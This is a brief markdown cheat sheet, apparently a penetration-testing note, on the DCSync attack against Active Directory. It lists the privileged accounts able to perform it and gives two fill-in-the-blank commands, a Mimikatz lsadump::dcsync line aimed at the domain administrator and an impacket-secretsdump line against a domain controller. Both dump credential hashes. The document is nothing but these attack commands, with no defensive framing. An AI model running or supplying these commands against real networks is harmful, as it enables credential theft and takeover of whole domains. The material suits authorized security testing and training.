# DC Sync

### Can be performed by Administrators, Domain Admins or Enterprise Admins as well as Domain Controller Machine Accounts

## Tools: Mimikatz , secretsdump

#### 1) Mimikatz

 - mimikatz lsadump::dcsync /domain:TARGET_DOMIAN /user:TARGET_DOMAIN\administrator

#### 2) secretsdump

 - impacket-secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
